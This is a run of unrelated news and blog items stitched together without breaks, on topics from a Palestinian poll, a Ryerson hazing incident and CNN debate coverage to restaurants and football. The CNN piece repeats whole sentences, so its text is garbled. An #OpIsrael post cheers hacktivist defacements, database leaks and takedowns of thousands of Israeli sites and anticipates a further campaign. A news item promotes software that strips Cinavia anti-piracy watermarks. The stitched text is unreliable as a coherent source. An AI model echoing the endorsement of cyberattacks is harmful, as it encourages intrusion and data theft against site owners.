However, an Indian MP's bid to introduce a private member's bill in the parliament to decriminalise gay sex failed.
Shashi Tharoor who also started a petition on Change.org over the issue, which has more than 40,000 signatories, said "it is time to bring the Indian Penal Code into the 21st Century".

Hamas's popularity has skyrocketed in the wake of Operation Protective Edge to the point where its deputy political bureau chief, Ismail Haniyeh, would win the presidency of the Palestinian Authority if elections were held today, according to a new survey of West Bank and Gaza residents.
The poll, which was overseen by Dr. Khalil Shikaki of the Palestinian Center for Policy and Survey Research, indicates that Haniyeh would attract 61 percent support among prospective Palestinian voters, easily outpacing incumbent Mahmoud Abbas of Fatah (32 percent).
In the Gaza Strip, Haniyeh has the support of 53 percent of residents, while in the West Bank the figure jumps to 66 percent.Hamas's popularity in the West Bank is at an all-time high following the 50-day long military confrontation with Israel.According to Shikaki's poll, if the race were a three-way contest between Haniyeh, Abbas, and jailed Tanzim leader Marwan Barghouti, Haniyeh would still emerge as the winner with 48 percent. Barghouti garners 29 percent support, whereas Abbas finishes a distant third with just 19 percent.The poll also finds that nearly 8 in 10 Palestinians believe Hamas defeated Israel in the recent round of fighting. In addition, the survey indicates that a majority of Palestinians would support copying Hamas's strategy of launching rockets into Israeli towns in the West Bank as well. Nonetheless, 63 percent of Palestinians believe the cease-fire serves national interests.In elections for the Palestinian parliament, Hamas would win 48 percent of the seats, while Fatah would take just 29 percent. Smaller Palestinian factions would win the remaining 19 percent.When asked about their views of the two-state solution, 51 percent of Palestinians said they were opposed, while 49 percent said they supported it.A majority – 53 percent – said it supported armed struggle against Israel, while just 20 percent said nonviolence was the best way to achieve statehood.Nearly nine in 10 Palestinians support renewed rocket fire against Israel if the Gaza blockade remains. Half of the respondents said they "understood" the strategy of launching rockets at Israel from civilian, built-up urban areas, while just 30 percent believe that Hamas fired rockets from these sites.The poll surveyed 1,270 people.

I was walking out of the Eaton Centre this afternoon, at Dundas Square, when I saw a group of Ryerson students run past in what first appeared to be some sort of group prank. There were two distinct groups- those who were wearing coveralls with “Ryerson Engineering” logos on them, and another group who were wearing either their underwear or t-shirts and shorts.
It was quickly apparent that the students in the coveralls were in-charge. Some of those in coveralls were spraying super-sized squirt guns on the scantily dressed students, others were yelling commands at them like drill sergeants. While some of the students were having a great time, it was obvious that others weren't. You could see the mix of anger, humiliation and cold on their faces (it was about +1 Celsius at the time).
The leaders stopped the group when they arrived at the skating rink at Victoria & Gould. Then, in what looked like a spontaneous decision, one of the leaders told the unclothed students they need to get down on the ground and crawl/slither their bodies across the mixture of ice, slush, open concrete and water on the surface of the rink. Horrified, I pulled out my camera and started recording.
As the junior students pushed their exposed bodies across the ice, the leaders in their coveralls screamed out at them like drill sergeants. Most of the people on the ground were far from impressed- but, when they started to get up, the senior students would start pointing at them and yelling at them to get back on the ground. What was being done to these students was unhealthy, humiliating and glaringly abusive.
At one point, when most of those crawling had already crossed, a male student in a tracksuit (most were male) leaned over behind one of the half-dressed female students and smacked her on her behind. I couldn't believe what I was seeing.
When all of the students had finished this miserable task, I asked one of the leaders what was happening. He told me that it was a “cross-leader initiation”.Ryerson University has very straightforward, and clearly written rules about hazing- specifically mentioning initiations:
“Students shall not engage in any act which endangers, or could reasonably be seen to endanger the mental or physical health or safety of a student, for the purpose of initiation, admission into, affiliation with, or as a condition for continued membership in, a group or organization.”
What happened today appears to have clearly violated this policy. Equally, when the male student smacked the female student in the ass (in-public) this must be contrary to the school's sexual harassment policy. Asking young women to run around in their underwear probably isn't so kosher either.
Hazing is an issue that's taken very seriously in Canadian universities, as is sexual harassment. In 2009, Ottawa's Carlton University suspended an entire women's soccer team for a hazing incident that supposedly included the use of alcohol. In 2005, Montreal's McGill university cancelled an entire football season after a student was sexually assaulted with a broomstick. Fredrickton's St. Thomas university had a hazing related death in 2010.
I shared this video on my Facebook and Twitter account this afternoon to gauge other people's reaction to what happened. Everyone responded with anger and distaste. Toronto city councillor Shelley Carroll (and former trustee on the Toronto school board had the most perfectly succinct response:
Indeed, they totally crossed the line. It's 2013 now and, somehow, students at Ryerson think it's acceptable to haze and sexually humiliate their fellow students. There's a serious problem, and an urgent need for an investigation…

Orlando City could announce the name of its new stadium as soon as this week, according to CEO Alex Leitão.
“Almost there,” Leitão told the Orlando Sentinel in an exclusive interview Monday. “I'm pretty confident that we are very close. Could be this week.”
“Those kinds of things, until it's done, there is no deal. We are in very advanced conversations and it's the right partner, and I'll be very happy if we are able to announce this as soon as possible.”
The eventual partner's name will grace five areas in the new stadium, based on master signage plans submitted to the city, including the upper left corner of a 1,935-square-foot image of the Lions' logo pained on architectural metal panels.
MLS stadiums command millions of dollars over 10 to 20 years for stadium naming rights. Banc of California recently inked a 15-year, $100-million agreement for the naming rights to the future stadium of 2018 expansion team Los Angeles FC, according to the LA Times, and Avaya Stadium, home to the San Jose Earthquakes, got its name in 2014 thanks to a deal with the tech company that cost $20 million over 10 years, according to the San Jose Mercury News.

Weird, weird second quarter on Wall Street.
It was devastating for almost everyone holding financial-company stocks, of course. And on the flip side, almost anything tied to the energy sector was golden -- in fact, better than gold. The average energy-related stock on the New York Stock Exchange surged 18.3% in the quarter, as the price of crude rocketed 37.8%, to $140 a barrel. The price of gold was up 1.1% in the quarter, to $926.20 an ounce.
The weirdness was in a lot of what was between the extremes of financials on one end (Bank of America Corp. , down 37% in the quarter) and well-known oil and gas plays on the other (ConocoPhillips, up 24%).
Here's a look at some of the highlights and lowlights:
--Utilities power up: The Dow Jones utility index gained 8.7% in the quarter. Historically, electric utilities have been a classic "defensive" stock sector, meaning a place to hide in times of market turmoil. That may have helped them last quarter. The diversification moves of some of the companies over the last decade into energy trading, telecom services, infrastructure and other areas also may be a draw for some investors.
But a traditional element of utilities' defensive appeal -- their dividend yield -- isn't much of a lure these days. The average annualized yield of the Dow utility stocks is 3%, not much above the 2.85% yield of the Dow industrials. And for the utility industry as a whole one big question looms: Will the companies' regulators allow them to fully pass through to customers the surging cost of fuel, as they have in the past?
--Transports on a roll: The Dow transportation stock index gained 3.4% in the three months and was the only one of the better-known indexes that was positive in the first half (up 8.3%) and that managed to reach a new all-time high (on June 5).
While airlines were hammered by soaring jet-fuel costs, their declines in the Dow transports index were offset by gains in railroad shares, including Union Pacific Corp. and CSX Corp. Soaring demand for coal and for farm commodities has been a boon for the rails, which do a big business hauling that stuff (it can't go FedEx, after all). Even so, some of the rail giants have warned that the recent Midwest floods could hamper their business in the near term.
--Mid-cap surprise: The Standard & Poor's index of 400 mid-capitalization stocks rose 5.1% in the quarter, a tremendous showing when you consider that the big-cap S&P 500 sank 3.2% in the period.
Although energy stocks helped both the mid-cap and big-cap indexes, the mid-cap index also benefited from particular strength in non-energy sectors including biotech (companies such as Vertex Pharmaceuticals), fertilizer and chemical firms (CF Industries Holdings and FMC Corp.) and infrastructure construction companies (Quanta Services Inc.). It also got a boost from a rebound in beaten-down shares of higher-education companies (including Strayer Education and ITT Educational Services).
--Black-and-blue chips: Could Dow Jones & Co.'s decision to add Bank of America to the Dow industrials index in February been more poorly timed? That addition gave the 30-stock Dow five financial issues (the others: American Express, American International Group, Citigroup Inc. and JPMorgan Chase & Co.).
In the midst of a horrendous credit crunch, that was just asking for trouble. Not surprisingly, the renewed plunge in financial issues was a major reason for the Dow's 7.4% decline in the second quarter. It also was a lousy three months for General Electric, General Motors and Coca-Cola Co., among other Dow issues.
What happened to the concept of blue-chips as havens in tough markets? As Wall Street's sell-off worsened dramatically in June, big-name stocks may have suffered from a case of "sell what you can," as I explain in this recent post.

A Filmmaker reader recently emailed me with a simple question. After going to film school, making some shorts and working conspicuously within his means, he's now written a script purely from the imagination — not censoring himself by thinking of things like money and production requirements. The resulting project, I take it, is too big for his usual DIY methods. He asked, “What do I do now?”
A tough question, not knowing the filmmaker very well and not having read the script. There are easier-said-than-done answers: “Find a producer! Get an agent!” But just sending out a bunch of PDFs, sitting back and hoping someone else will make your movie (or tell you why they won't) is only one approach. For those who want to be more proactive, here are 15 things that can be done starting now. (If you're a GTD junkie, consider these all possible “next steps.”) Keep in mind that this list, which is by no means inclusive, was written with a first-time writer/director in mind, someone who may necessarily be working outside the system to get his or her film made.
1. Proofread your script. Do it yourself, and then have an eagle-eyed friend do it again. Seriously.
2. Get it out for feedback from people you trust. Be patient. It can take people a while to read things. Patiently follow up, and after they do read it, encourage them to give you honest advice. Ask them specific questions about what works for them and what doesn't. Consider putting together a reading and then soliciting feedback after — both in a Q&A session and through follow-up emails. (I actually hate going to readings, but admit that they can sometimes be helpful.) And, if you're hoping for industry finance, get it covered. All studios and most production companies hire readers to do coverage — a synopsis, comments, and grid rankings of its various elements (concept, characters, etc.). You can hire these people too. Just ask a contact at a company who their best reader is and if that person would be willing to take on a freelance assignment. And then pay that person to do private coverage for you. For a relatively small amount of money you'll learn how a more marketplace-attuned person will view their script without risking a pass from a company you may be interested in.
3. Rewrite the script based on the feedback you receive. For your readers, did the story work? Did the characters track emotionally as they progressed through the script? Was the dialogue fresh? Were there formatting or exposition issues that threw people out of the story? Did you write characters actors will want to play? I can't tell you how many scripts I read that are really just first drafts. It's clear their writers haven't drilled down, identified their scripts' weaknesses, and worked to fix them. Recognize that writing is a skill, and rewriting is a related but separate one. You need to do both.
4. Be social. Friends + family + Kickstarter + grants is the model for many low-budget films today. And in order for your crowdfunding to be effective, you'll need a social footprint. Whether it's a Facebook page, a standalone website, a Tumblr account or a Twitter account — or all four — it will help to have a base of followers to seed your news and funding requests to. Start with at least one of the above now and begin refining your “social voice” and attracting followers.
5. Hire the right person to schedule and budget the script. Take particular note of the third and fourth words of the preceding sentence. Whatever you imagine the budget to be, hire a line producer or UPM familiar with that budget range and, if it's a seven or eight-figure budget, one that's acceptable to the completion bond company you'll ultimately need. If you don't know how to identify this person, ask a producer you do know or even a bond company for a recommendation. If you think your film will be made on a micro budget, hire someone who has actually made a film for that budget. And if you do the latter, don't just say thanks once you get the budget back. Sit down with that person and find out what you need to do and what connections you'll have to make to reel in the people and gear budgeted for at below-market rates.
6. If you don't know someone who can budget it or can't afford to hire someone, learn to budget it yourself. Two books I can recommend are Film and Video Budgets and Maureen Ryan's Producer to Producer (not strictly a budgeting book, but with budgets and much useful information).
7. Rewrite the script based on the budget and schedule you receive. Is there a 1/8″ page scene that drives the budget up significantly —— and that you don't really need? Are the project's budgetary needs, the marketplace, and the final budget number in alignment? If you're directing this script, is it appropriately scaled for what you'll be able to command as attached talent?
8. Make a cast list and/or try to attach a casting director. You may need to raise funds — or commit some of your own — to pay a casting director a retainer or consultancy fee. If you can't afford that, look for a casting associate or assistant at one of the established casting agencies and see if you can entice them to take on your project — with, you hope, the mentorship of their bosses. If your script is really good, you might be able to get the latter for little or even no money,
9. If you are going the new or non-actor route, find those people. Start doing open calls, work with local casting directors on street casting, and embed yourself in the communities where you'll find these people.
10. Get it to producers. Or produce it yourself, or maybe find someone young and hungry who wants to be a producer and get to work developing him/her. If you look at the early careers of virtually every successful independent producer you'll note the beginning project on which some director took a chance on them. For little or no pay, the director got a dedicated person not juggling ten thousand other projects — someone excited to be making a movie. Don't just to look to the established people; find the up-and-comers. (Alternately, look to established producers who, if they can't commit fully, can executive produce with someone they approve working as the formal producer.)
11. Start looking for money on your own — don't wait for someone to do it for you. Finding money is a job like any other. Yes, it can be tough without the social connections. But the only way to start is by building an investment package and then pounding the pavement, asking everyone you know if they or someone they know might be interested in investing in a film. Look for people who might want to support you or who are inspired by the subject of your movie. And when people say no, as many will do, don't end the conversation without getting from them a lead on someone else to approach. If you think you'll do a Kickstarter or Indiegogo campaign, decide when to launch. Should you do it now, so you'll have some money raised to cover development or perhaps even entice a producer? Or later, when you'll need it in post. If you want to do it early, start putting that crowdfunding campaign together. (Check out this essential post by Zak Forsman on how he made his campaign a success.)
12. Make what's known as a “mood reel.” I used to dismiss these, but they are increasingly in vogue these days. They can be called other things — “visual look books,” for example — and are short reels of scenes from other films (or perhaps your own test footage) edited to suggest the tone of your movie. In Britain, the funding agencies are beginning to fund these as part of development grants. For an example, check out the one on Ryan Koo's Kickstarter page.
13. Assemble collaborators. You can't make a film on your own. Can you get a great d.p. attached, or a fantastic editor? You may not have a name, but you might be able to get to someone who does, and their presence will both add value to your project and provide you with the talent you need by your side.
14. Submit it to a development lab, professional support program or a contest. The Sundance Labs, the IFP Emerging Narrative Program, the Film Independent Labs, Tribeca's All Access Program — there are filmmaker support mechanisms out there that can help you refine your vision, connect with the industry, or both. As an example of how this process can lead to a film being financed, read this old article of mine, “Everyone She Knew,” about how Miranda July endured multiple rejections from the Sundance Labs before finally getting in and then moving her debut feature into production. (Sometimes this process leads to you not directing your film, but that can be okay. Here's Marc Maurino on his journey after attending IFP Emerging Narrative.) Or, submit your script to a contest, like the Nicholl Fellowships. I produced a film once that received its funding after the director submitted it to a screenwriting contest and one of the judges took a liking to it and climbed on board as producer and financier.
15. If you're not getting traction on any of the above, ask yourself why. What's not working? Why aren't people falling in love with it? And then, put the script down for a month. When those 30 days are over, reread it, think about how to make it better, and get to work.
If any of the above is helpful and you'd like to read more responses to reader questions on the blog, send your own questions about filmmaking to scott@filmmakermagazine.com. If I can't give you an answer, I'll get it to someone who can and post the response here.

The consensus headline from the third and final presidential debate was Republican candidate Donald Trump's refusal to commit to accepting the 2016 election results. It was a stunning rebuke of American political norms from the nominee of a major political party, and it quickly dominated coverage online Wednesday night and in print newspapers Thursday from the third and final presidential debate was Republican candidate Donald Trump's refusal to commit to accepting the 2016 election results. It was a stunning rebuke of American political norms from the nominee of a major political party, and it quickly dominated coverage online Wednesday night and in major morning .The Associated Press' lede said Trump is “threatening to upend a fundamental pillar of American democracy.”
At CNN, however, confusion initially reigned. The network's journalists expressed shock at Trump's comments within seconds of the debate's conclusion. “One of the most stunning things I've ever heard in a presidential debate, ever,” said Jake Tapper, the network's chief Washington correspondent. The news organization's which led CNN's homepage Thursday morning: At CNN, however, confusion initially reigned. The network's journalists expressed shock at Trump's comments within seconds of the debate's conclusion. “One of the most stunning things I've ever heard in a presidential debate, ever,” said Jake Tapper, the network's chief Washington correspondent. The news organization's online coverage echoed that language,which ledCNN's homepage Thursday morning:
But pro-Trump contributors attempted to muddle this point during a panel discussion after the debate, when viewership was likely highest. Their baseless speculation that the election might somehow be rigged overstepped CNN's reporting and undercut its purported goal of informing its audience. The comments, which drew stern rebuttals from other CNN on-air talent, highlight how the network's pursuit of the appearance of objectivity in 2016 has distorted its final product on television. It also provides a clear example of how the channel's model puts CNN journalists in the awkward position of fact-checking CNN contributors in real time.
Beginning the post-debate panel, Chief Political Analyst Gloria Borger, a journalist, echoed Tapper in describing Trump's comments as “stunning.” Jeffrey Lord, a pro-Trump talking head, retorted by inaccurately comparing them to when Democratic candidate Al Gore challenged the vote count in 2000. Borger rightly shot down this analogy—Gore's challenge was after the fact, with a legitimate recount underway—which drew charges of “double standards” from Lord. “You're illustrating the problem,” he said.
The smokescreens didn't end there. After analyst Van Jones correctly shook his head at this comparison and criticized Trump for an apparent disrespect for democratic values, contributor Kayleigh McEnany also The smokescreens didn't end there. After analyst Van Jones correctly shook his head at this comparison and criticized Trump for an apparent disrespect for democratic values, contributor Kayleigh McEnany also offered up a Hail Mary for Trump:
MCENANY: I'm truly perplexed to hear you talk because you're asking him to accept something that hasn't happened yet. None of us know what is going to happen on Tuesday, November 8th. JONES: We're going to have an election in our country. There's been 240 years of it. MCENANY: And in fact, I'm going to cite J. Christian Adams, who was a voting attorney, voters attorney for the Department of Justice, said that there are as many as four million dead people registered to vote right now. There is voting fraud out there. Donald Trump is going to — JONES: That's not voting fraud. ANDERSON COOPER: That's not voting fraud. MCENANY: Dead people vote? [CROSSTALK] COOPER: You're making that up.
You're making that up . Such put-downs from a CNN journalist to a CNN contributor would be surprising, except that they have been necessary embarrassingly often over the course of this campaign. Trump's divorce from truth on the trail has been buttressed by talking heads relaying his misinformation on cable. This divide is particularly striking at down-the-middle CNN, which has built out a first-rate team of political reporters that aggressively challenges the veracity of these very claims. And Trump's conspiracy theory that the election will be rigged against him has only magnified it further.
When the topic came up on Wednesday afternoon's CNN Newsroom , host Brooke Baldwin rejected the premise, put forth by Lord, that a rigged election was even possible. “I don't doubt there are certain instances,” she said. “But in terms of widespread voter fraud, that's just not true.” She might as well have been speaking to a brick wall, as seen in the clip below:

Such exchanges aren't lost on CNN journalists off-camera. Dylan Byers, senior reporter for media and politics, fired off a string of tweets condemning Lord's evidence-free remarks.
Jesus… Jeffrey Lord is on air saying “just because I push the button for Donald Trump doesn't mean my vote will be cast for Donald Trump.” — Dylan Byers (@DylanByers) October 19, 2016
The baseless rigged election talk is as low as it gets…. Every surrogate who pushes it will be remembered for doing so after the election. — Dylan Byers (@DylanByers) October 19, 2016
CNN journalists often provide such pushback. On Sunday's Reliable Sources , for example, Brian Stelter gave an CNN journalists often provide such pushback. On Sunday'sReliable Sources, for example, Brian Stelter gave an impassioned monologue slamming Trump's repeated claims of vote rigging, which he described as “propaganda tactics.” But with on-air contributors also peddling such conspiracy theories—and on high-stakes debate nights in particular—it's worth asking what viewers' takeaways might actually be.
These contradictions are an effect of how CNN designs its cable programs. In an These contradictions are an effect of how CNN designs its cable programs. In an interview at the Harvard Kennedy School last week, CNN President Jeff Zucker argued that its formula for live panel discussions—reporters, analysts, and partisans—wouldn't be complete without pro-Trump voices. Critics of the setup, Zucker said, “don't like the idea of the Trump candidacy, and that's just a projection of ‘How could you have those people on the set?' Well, we have them on the set because somebody's got to represent 14 million people who voted for the guy [in the Republican primary].”
The explanation came after another The explanation came after another interview this summer in which Zucker defended the hire of former Trump campaign manager Corey Lewandowski, who has a non-disparagement agreement with the GOP nominee and until recently was receiving severance from his campaign. “It's really important to have voices on CNN who are supportive of the Republican nominee,” Zucker said. “It's hard to find a lot of those.”
Perhaps there's a reason few intellectually honest political experts back Trump. But put aside the fact that this is the Perhaps there's a reason few intellectually honest political experts back Trump. But put aside the fact that this is the textbook definition of false balance , and that Lewandowski in particular has an obvious conflict of interest. CNN contributors are introducing false information into the network's programs.
Lewandowski is the ultimate case study in this regard. When I Lewandowski is the ultimate case study in this regard. When I reviewed a week's worth of his on-air appearances last month, it quickly became clear that he injected falsehoods at many turns. Take his defense of Trump's indefensible birther lie, as seen in part below. Pay special attention to how CNN host Don Lemon patiently bats down Lewandowski's arguments:

Such surreal “analysis” goes beyond the usual parroting of partisan talking points, with statements clouding, if not contradicting, CNN's own reporting. The network's journalists have performed admirably under these circumstances, particularly with the election looming ever closer. But the argument that this setup adds value for the audience, on balance, is dubious at best.
Trump certainly benefits by having these voices on air, regardless of whether what they're saying is true. It's yet another example of how his penchant for lies and innuendo has exposed weak points in the traditional structures of political journalism. Cracks were initially evident last year in newspaper-style coverage, though that genre has long since become openly adversarial, if not contemptuous, of the GOP nominee. More recently, there's been speculation of internal squabbles at Fox News, which is composed of both real journalists and avowed Trump fanboys, like Sean Hannity.
CNN pays pro-Trump contributors to provide it with a shinier veneer of objectivity. But it's become all too clear in recent months that this mission actively harms its journalists' pursuit of the truth. The news organization must clarify where its real priorities lie.

Cinavia's anti-piracy technology has been a thorn in the side of many file-sharers, who are unable to play pirated files on their DVD-players without being interrupted by a warning message. In a breakthrough development, software vendor DVD-Ranger has cracked the protection, including for popular movies downloaded from pirate sites.
Cinavia's anti-piracy technology relies on a unique type of watermarking that allows it to remain present in pirated movies despite re-recording, transcoding, compression, or other type of transfer.
This means that camcordings of Cinavia-protected first-run movies, Blu-ray and DVDrips can be easily detected.
Support for the technology has been mandatory for all hardware and software Blu-ray players since 2012, which causes headaches for many pirates every day. Pirated movies protected by Cinavia work at first, but after a few minutes playback is halted and a warning notice appears on the screen instead.
“Audio outputs temporarily muted. Do not adjust the playback volume. The content being played is protected by Cinavia™ and is not authorized for playback on this device,” one of the notices reads.
Cinavia has been hailed as an unbeatable anti-piracy technology and up until today it was impossible to crack through a simple software solution. However, after several years DVD-Ranger has now solved the puzzle.
The company informs TorrentFreak that their Cinavia removing solution is now able to remove the play restrictions from pirated downloads in various video formats, something that was previously impossible.
“We have improved DVD-Ranger for use with torrent files. Now DVD-Ranger CinEx HD can remove Cinavia from downloaded torrent video files such as avi, mkv, mp4, mov and others,” DVD-Ranger's Ingo Förster explains.
“The new module first scans the audio and then removes the Cinavia protection on the first pass. The contained video and subtitles will be handled pass-through, meaning that only the selected audio track will be re-encoded,” he adds.
On their website the software specifically targets BitTorrent pirates, many of whom have run into Cinavia protection in recent years. With DVD-Ranger's “CinEx HD Advanced” software this is no longer a problem, although freedom doesn't come cheap at $69.99 per license.
Förster and his colleague at DVD-Ranger have been working in the DVD-copying business for over a decade. For them, it was mostly the challenge that made them decide to break the Cinavia technology.
“Me and my partner are working both in science jobs and we were in contact with digital watermarks many years before Cinavia was born, so we know many things about digital watermarking. After we saw how many problems the major players such as DVDFab and Slysoft had with Cinavia, we started our own development,” Förster says.
Technically, Cinavia is not copy protection so the German based developer doesn't believe they are breaking any laws. The files can be copied with and without a watermark, and their software only removes these “play” restrictions.
“In our country it is only forbidden to develop and sell software that circumvents copy protection. The law doesn't mention digital watermarks. So is it legal? Definitely,” Förster notes.
In any case, DVD-Ranger's breakthrough is likely to cause concern at Verance, the company where Cinavia is developed. Perhaps it's the start of a new watermarking arms race?

Kathleen Chada, a clinic manager, of Ballinkillen, Bagenalstown, Co Carlow, sued Sanjeev Chada (45), whose address was given as Arbour Hill Prison in Dublin.
Mrs Chada sued him for assault, battery and trespass on the person causing the deaths of Eoghan (10) and Ruairí (5) Chada at Skehanagh Lower, Ballintubber, Co Mayo, in late July 2013.
He was jailed for life in October 2014 after pleading guilty to the murders.
The Central Criminal Court heard the boys' bodies were discovered in the boot of Chada's car on July 29, 2013, after it had crashed into a wall near Westport with him in the driver's seat.
Chada, who had run up gambling debts, told his wife he was taking their sons bowling in Carlow but instead drove to Mayo where he strangled the boys with a rope before trying to kill himself.

The court also heard Chada had secretly mounted huge debts from online trading and had borrowed from family and friends and lost large amounts of money.
He was €500,000 in debt at one stage from gambling other people's money.
He told gardaí he killed them "because I love them so much".
In a victim impact statement at the boys' inquest, Mrs Chada said that her two sons had "everything to live for".

"So much potential cut down in such a cruel and violent way by their own father who they loved and adored. He was their hero. How can evil such as this have been hidden for so long in a seemingly loving father?
"How can he be so utterly, utterly selfish? He has robbed us of so very, very much - me, our family and the boys' friends and the community. Who can ever know what potential the boys had in the future? It is all gone."
Yesterday, Mr Justice Seamus Noonan was told Sanjeev Chada was not contesting the judgment application.
The judge said it was not necessary for Mrs Chada to give evidence.
He told her he was "terribly sorry over the tragedy that has befallen your family. It was an unspeakable tragedy and you have my sympathy". Mrs Chada thanked the judge.
The court was told the boys' maternal grandparents had waived any claim in relation to the case as had the paternal grandmother who lives in Romford, England.
Mr Justice Noonan was also told a sum for the legal costs had also been agreed.

If the last two elections were a renaissance for data-driven journalism, turning statistician Nate Silver into a household name, the current presidential cycle seems like a return to the Dark Ages. After years in which we grew accustomed to thinking of polling as more science than art, Donald Trump's spectacular rise to the top of the G.O.P. field turned the entire world of political punditry on its head. How did everyone, Silver included, fail to predict the possibility that a candidate initially written off as a joke (and a racist, to boot) might find himself a stone's throw away from either triggering a historic contested convention or winning the Republican nomination outright?
One reason, Silver suggests, is that Trump represents a “black swan”—a concept developed by risk analyst Nassim Taleb to describe incredibly rare, hard-to-predict events, like the 9/11 attacks, that have an outsize impact. “To be fair, we were more skeptical than the average—we weren't saying it was [a] zero” percent chance, Silver, the editor-in-chief of FiveThirtyEight, told Peter Kafka in a recent Re/Code podcast. But “if you're going to have a 2 percent, 5 percent probability come through, it better look pretty weird.”
Silver, a statistician by trade and an early proponent of sabermetrics in baseball, was looked to as a presidential soothsayer after he correctly predicted the outcome of the 2012 presidential election in the electoral college, state by state. Like most everyone else, he dismissed Trump's chances back in 2015, sticking to his predictions even as the lurid orange spoiler climbed higher and higher in the polls. Silver has since admitted he misjudged the extent of the billionaire's populist appeal—although, he argued, Trump's candidacy could just as easily have failed to reach escape velocity if a few more states hadn't broken his way, or if the media hadn't covered him so much.
“But instead, we are seeing the Republican party on the verge of falling apart,” he told Kafka. “I know those are strong words, but to have a nominee who is at odds with every institution that had power in the party before, I just—you know—there's almost no recent precedent for it in American history, and I don't know enough pre-World War II history to say if there was a distant precedent for it, but that is pretty substantial.”
If Trump can secure the nomination, Silver now believes Trump has a 25 to 30 percent chance of winning the general election—a possibility he acknowledges was difficult at first for him to recognize. “I guess one reason I kind of thought, well, this is very unlikely to happen, because if it happens, it's going to be so incredibly consequential,” said Silver. “And now that it's happening, it's incredibly consequential for the Republican Party.”

#OpIsrael
The year 2013, Anonymous strikes with all it has! But, this time, The Legion has a different agenda. Though, the initiation of this war against the intolerable happenings wasn't contemporary.
This operation initiated way back when Israel threatened to shut down all communications and Internet in the so-called occupied territory in Palestine in 2012.
It was the first time when Israeli government received a warning from Anonymous to seize probable activities along with the genocide in Palestine.
War against Israeli Cyberspace
After repeated warnings, Israeli government ignored the ultimatum, and The Legion had to proceed as planned. Anonymous targeted approximately 10,000 websites in Israeli cyberspace; including those that represent the government.
Anonymous declared a cyber-war against Israel. Within a few hours, 9000+ websites were down or defaced and 700+ websites critically affected along with several databases leaked or erased by the attack.
The Elite Squad
In 2013, an elite force of hackers attacked Israeli cyberspace with the intension to erase Israel from the face of the Internet. The participants in this digital protest were:
Anonymous
AnonGhost
Mauritania Hacker Team
Ajax Team
MLA
Moroccan Hackerz
Sector 404
Gaza Hacker Team
Gaza Security Team
Anonymous Syria
The Hacker Army
RedHack
PLF
X-BLACKERZ INC
Devil Zone Team
Moroccan Hackers
Algerian Hackers
The Promise
The Legion was responsible for the hacks, defaces, ducks, hijacks, database leaks, admin takeovers and other attacks on Israeli cyberspace – a payback for their inhumane behavior and actions in Palestine.
As they say and I quote:
“We are Anonymous. We are Legion. United as one; divided by zero. We do not FORGIVE! We do not FORGET! It's too late to EXPECT us”.
The Response
Here's media's response to the digital protest hosted and participated in by Anonymous along with other hacktivists group around the globe.
Think Again!
You must be wondering that why am I telling you year old story? Well, because Gaza is under attack, AGAIN. When we were all consumed by FIFA World Cup 2014 fever; when we were chanting for our favorite players; when we were predicting the world cup winner, Israel continued its merciless activities in Palestine.
Gaza Under Attack
Yes! Gaza has been victimized again. Many have been killed in the recent attacks executed by Israel. Operation Israel V.01 and V.02 were a success – or were they? Version 1.0 was a fair warning to Israel. Whereas, version 2.0 represented the execution and consequences of Israeli government shunning repeated warnings by Anonymous.
#OpIsrael v.3.0
After a year, Israel is back on its killing spree. Shall we be seeing Operation Israel version 3.0 or something bigger than the previous happenings? Because, the squad is back in action; #OpIsrael and #OpSaveGaza are active. As a matter of fact, some of the former protestors have disclosed some newly hacked or defaced websites representing Israel or should I say Israhell as pronounced by Anonymous Arab. Are we looking at Operation Israel Version 3.0 here? Is it too late to expect – Anonymous?
Pour House to become Highwater
Next month, Pour House will transform into Highwater. And it's going to be real eclectic. Among the new menu items: chicken adobo, a shrimp po'boy, New Mexican green chili cheese fries, Kalua pork and grilled bratwurst with beer cheese.
Yes, that selection does hit the Philippines, New Orleans, New Mexico, Hawaii and Germany. It makes sense, though, when you take into account the bar's new ownership: D.J. Rogers and Mick Stevenson of Dad's Sandwiches and Dad's on J. The pair bought the place from Trevor Shults (Barwest, Crawdads on the River) in the fall and have slowly been plotting Pour House's rebranding. They already transformed the old vape lounge in the back into a second bar and added way more music to the event calendar.
On Friday, August 12, Pour House (1910 Q Street) will officially become Highwater. It'll carry a “high desert, western theme,” according to bar manager Justin Isaacks, with a huge mural from Shaun Burner and Dan Osterhoff. Plus, lots of live music and deejay nights both in the front and back bar areas.
Food-wise, chef Stevenson is completely overhauling the menu with influences from his North Carolina roots, time in New Mexico and family from the Philippines. But there will also be the sort of fare you'd expect from Stevenson, like a massive burger. Between small plates, salads, sandwiches and main dishes, nothing tops $15. Highwater will continue offering brunch. Instead of the completely Southern-leaning menu, expect a mix of traditional dishes and experiments, such as flan French toast. Bottomless mimosas? Check.
For the first time, the space will also serve lunch. Highwater's hours will be 11 a.m. to 2 a.m. Monday through Friday and 9 a.m. to 2 a.m. Saturday and Sunday.
According to Isaacks, the main feedback the new ownership team received early on was that the food prices didn't match the quality and it took way too long to get a drink. With the latter in mind, Highwater is abandoning Pour House's preserves-based cocktail program.
“Simpler, no-fuss type stuff,” Isaacks says of the new menu. “We're not trying to compete with the craft cocktail market.”
Pour House will close on Sunday, August 7 for a couple of days, then softly open until the August 12 grand opening celebration.

Last week, Seahawks general manager John Schneider publically confirmed that the team is open to trading backup quarterback Matt Flynn, no surprise given Russell Wilson's ascension into the starting role and the number of teams who will be looking for help at the position.
“I'd be lying to you if I told you that we wouldn't be listening to people,” Schneider told 710 ESPN Seattle.
But how many of those teams would be willing to trade with the Seahawks for Seattle's backup quarterback? That's a pertinent question in light of a recent tweet from Jason Cole of Yahoo! Sports suggesting the Seahawks might have a hard time finding a trade partner because several teams expect them to cut Flynn.
Cole elaborated on that tweet when he joined “Bob and Groz” on Wednesday. He said he doesn't necessarily think the Seahawks will cut Flynn, only that he's heard from other teams who say they think that will happen.
Keeping Flynn as a backup or dealing him to a quarterback-needy team would be the Seahawks' other options. Cole thinks the Jets – whose new general manager, John Idzik, previously worked in Seattle's front office – would be among the teams most interested in Flynn.
“Nobody's going to pay a huge amount for him, but somebody may pay something for him,” Cole said. “The question for the Seahawks is, is that enough compared to what you need to have at backup quarterback when you're a contending team?”
Bob Stelton and Dave Grosby share their thoughts on that question in the video below.

